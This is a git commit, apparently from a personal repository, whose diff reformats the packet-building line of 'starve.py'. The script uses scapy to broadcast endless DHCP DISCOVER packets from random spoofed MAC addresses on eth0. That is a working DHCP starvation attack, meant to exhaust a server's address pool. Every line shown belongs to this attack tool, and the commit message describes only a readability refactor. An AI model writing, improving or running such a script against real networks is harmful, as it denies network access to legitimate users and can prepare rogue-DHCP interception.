711fb26e50dc3d0e98b98921fe107ca323ec4f16
Collin Lane <55359438+collln@users.noreply.github.com>
2026-03-24 10:13:17 -0400

    Refactor packet creation for better readability

--- starve.py
+++ starve.py
@@ -10,7 +10,11 @@ try:
     while True:
         mac = random_mac()
         raw = mac.replace(':','')
-        pkt = (Ether(src=mac,dst='ff:ff:ff:ff:ff:ff')/IP(src='0.0.0.0',dst='255.255.255.255')/UDP(sport=68,dport=67)/BOOTP(chaddr=bytes.fromhex(raw.ljust(32,'0')[:24]),xid=random.randint(1,0xFFFFFFFF))/DHCP(options=[('message-type','discover'),'end']))
+        pkt = (Ether(src=mac,dst='ff:ff:ff:ff:ff:ff')
+               /IP(src='0.0.0.0',dst='255.255.255.255')
+               /UDP(sport=68,dport=67)
+               /BOOTP(chaddr=bytes.fromhex(raw.ljust(32,'0')[:24]),xid=random.randint(1,0xFFFFFFFF))
+               /DHCP(options=[('message-type','discover'),'end']))
         sendp(pkt,iface='eth0',verbose=0)
         count += 1
         if count % 10 == 0:
